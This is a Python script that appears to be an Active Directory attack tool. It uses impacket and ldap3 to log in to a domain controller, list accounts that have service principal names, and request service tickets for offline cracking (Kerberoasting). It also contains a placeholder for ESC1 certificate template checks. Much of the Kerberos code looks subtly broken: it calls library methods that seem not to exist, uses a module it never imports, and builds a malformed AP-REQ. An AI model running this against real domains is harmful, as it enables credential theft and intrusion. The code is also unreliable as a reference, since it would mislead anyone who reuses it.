from impacket.krb5.asn1 import AP_REQ, Authenticator
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
import ldap3

def kerberos_auth(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Initialize the client CCache
        ccache = CCache()

        # Get TGT from KDC
        krbtgt = ccache.new_creds(username, password, domain)

        smb.logoff()

        return ccache, krbtgt

    except Exception as e:
        print(f"Error during Kerberos authentication: {e}")
        return None, None

def ldap_auth(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller
        server = ldap3.Server(dc_ip)

        # Bind with LDAP credentials
        conn = ldap3.Connection(server, user=f"{domain}\\{username}", password=password, authentication=ldap3.NTLM)

        # Perform the bind operation
        if not conn.bind():
            print("LDAP authentication failed.")
            return None
        else:
            print("LDAP authentication successful.")
            return conn

    except Exception as e:
        print(f"Error during LDAP authentication: {e}")
        return None

def find_kerberoastable_accounts(domain, dc_ip):
    try:
        print("Searching for kerberoastable accounts...")

        # Connect to the Domain Controller via LDAP
        server = ldap3.Server(dc_ip)
        conn = ldap3.Connection(server, auto_bind=True)

        # Search for kerberoastable accounts
        conn.search(search_base=domain,
                    search_filter="(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        # Retrieve kerberoastable account names
        kerberoastable_accounts = [entry['attributes']['sAMAccountName'] for entry in conn.entries]

        print(f"Found {len(kerberoastable_accounts)} kerberoastable accounts.")

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while searching for kerberoastable accounts: {e}")
        return []

def check_esc1_certificate_templates(domain, username, password, dc_ip):
    try:
        print(f"Attempting to check ESC1 certificate templates on {dc_ip}")

        # Connect to the Domain Controller via LDAP
        conn = ldap_auth(username, password, domain, dc_ip)

        if conn:
            print("Successfully authenticated via LDAP.")
            
            # Placeholder for ESC1 certificate template check
            print("ESC1 Certificate template check will be implemented here.")
        else:
            print("Failed to authenticate via LDAP.")

    except Exception as e:
        print(f"Error while checking ESC1 certificate templates: {e}")

def kerberoast(domain, username, password, dc_ip):
    try:
        print(f"Attempting to Kerberoast accounts from {dc_ip}")

        # Get TGT ticket for the specified user
        ccache, krbtgt = kerberos_auth(username, password, domain, dc_ip)

        if krbtgt:
            print("Successfully obtained krbtgt ticket.")
            
            # Find kerberoastable accounts and request service tickets
            kerberoastable_accounts = find_kerberoastable_accounts(domain, dc_ip)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
                    # Request service ticket for the kerberoastable account
                    service_ticket = request_service_ticket(ccache, krbtgt, account)
                    if service_ticket:
                        print("Service ticket obtained.")
                        print(service_ticket)
                    else:
                        print("Failed to obtain service ticket.")
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def request_service_ticket(ccache, krbtgt, target_user):
    # Request service ticket for the target user
    try:
        # Build the AP-REQ request
        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = constants.ApplicationTagNumbers.AP_REQ.value
        ap_req['ap-options'] = constants.GSS_C_MUTUAL_FLAG | constants.GSS_C_SEQUENCE_FLAG
        ap_req['ticket'] = krbtgt['ticket']
        ap_req['authenticator'] = types.EncryptedData()

        # Build the Authenticator
        authenticator = types.EncryptedData()
        authenticator['etype'] = krbtgt['ticket']['enc-part']['etype']
        authenticator['cipher'] = krbtgt['ticket']['enc-part']['cipher']

        # Set the target user principal
        target_principal = Principal(target_user, type=constants.PrincipalNameType.NT_PRINCIPAL)

        # Pack the AP-REQ request
        ap_req_data = ap_req.getData()

        # Send the AP-REQ request to the KDC and get the service ticket
        service_ticket = ccache.getKerberosTicket(ap_req_data, target_principal)

        return service_ticket

    except Exception as e:
        print(f"Error while requesting service ticket: {e}")
        return None


# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(domain, username, password, dc_ip)
check_esc1_certificate_templates(domain, username, password, dc_ip)